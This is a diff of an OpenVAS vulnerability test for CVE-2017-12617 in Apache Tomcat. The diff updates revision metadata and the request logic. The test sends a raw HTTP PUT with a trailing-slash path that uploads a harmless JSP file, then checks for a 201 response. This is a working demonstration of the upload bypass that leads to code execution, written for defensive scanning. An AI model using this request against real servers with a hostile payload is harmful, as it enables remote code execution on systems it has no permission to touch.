@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_apache_tomcat_http_put_jsp_upload_code_exec_vuln.nasl 11983 2018-10-19 10:04:45Z mmartin $
+# $Id: gb_apache_tomcat_http_put_jsp_upload_code_exec_vuln.nasl 13994 2019-03-05 12:23:37Z cfischer $
 #
 # Apache Tomcat 'HTTP PUT Request' JSP Upload Code Execution Vulnerability
 #
@@ -29,12 +29,12 @@ CPE = "cpe:/a:apache:tomcat";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.811854");
-  script_version("$Revision: 11983 $");
+  script_version("$Revision: 13994 $");
   script_cve_id("CVE-2017-12617");
   script_bugtraq_id(100954);
   script_tag(name:"cvss_base", value:"6.8");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2018-10-19 12:04:45 +0200 (Fri, 19 Oct 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2019-03-05 13:23:37 +0100 (Tue, 05 Mar 2019) $");
   script_tag(name:"creation_date", value:"2017-09-25 17:29:27 +0530 (Mon, 25 Sep 2017)");
   script_tag(name:"qod_type", value:"exploit");
   script_name("Apache Tomcat 'HTTP PUT Request' JSP Upload Code Execution Vulnerability");
@@ -77,24 +77,24 @@ include("http_func.inc");
 include("http_keepalive.inc");
 include("misc_func.inc");
 
-vtstring = get_vt_string();
-
-if(!tomPort = get_app_port(cpe:CPE)){
+if(!tomPort = get_app_port(cpe:CPE))
   exit(0);
-}
+
+if(!get_app_location(port:tomPort, cpe:CPE))
+  exit(0);
 
 host = http_host_name(port:tomPort);
 
 postData = '<% out.println("Reproducing CVE-2017-12617");%>';
 
-rand = '/' + vtstring + '_' + rand() + '.jsp';
+vtstrings = get_vt_strings();
+rand = '/' + vtstrings["lowercase_rand"] + '.jsp';
 url = rand + '/';
 
 req = string("PUT ", url, " HTTP/1.1\r\n",
              "Host: ", host, "\r\n",
              "Content-Length: ", strlen(postData), "\r\n",
              "\r\n", postData);
-
 res = http_keepalive_send_recv(port:tomPort, data:req);
 
 if(res =~ "^HTTP/1\.[01] 201")
